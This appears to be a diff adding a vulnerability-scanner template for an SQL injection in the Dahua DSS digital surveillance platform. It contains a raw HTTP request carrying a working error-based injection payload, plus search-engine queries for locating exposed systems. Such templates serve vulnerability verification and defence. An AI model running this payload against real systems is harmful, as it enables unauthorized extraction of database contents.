@@ -1,0 +1,30 @@
+id: dahua_attachment_getAttList_sqli
+
+info:
+  name: dahua_attachment_getAttList_sqli
+  author: recjl
+  severity: high
+  description: 大华 DSS 数字监控系统 attachment_getAttList.action SQL 注入,攻击者 /portal/attachment_getAttList.action 路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息
+  metadata:
+       max-request: 1
+       verified: true
+       fofa-query: body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>" || body="dahuaDefined/headCommon.js" || title=="DSS"
+       hunter-query: web.body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>"||web.body="dahuaDefined/headCommon.js"||title=="DSS"
+  tags: sqli,dahua,hw
+
+http:
+  - raw:
+      - |
+        GET /portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"XPATH syntax")
+# digest: 4b0a00483046022100941e35f9ea79fb03cd5bcce7d6c6ba1040b174cd26278ac146f6365ef2afab88022100acdc08f5bd72aa1e7a6dcc5fcbb36aae8ddd56cdb6d06b710e58ab73898ad80d:6b2dd5af372f02ed15a56faf8ad98cf9
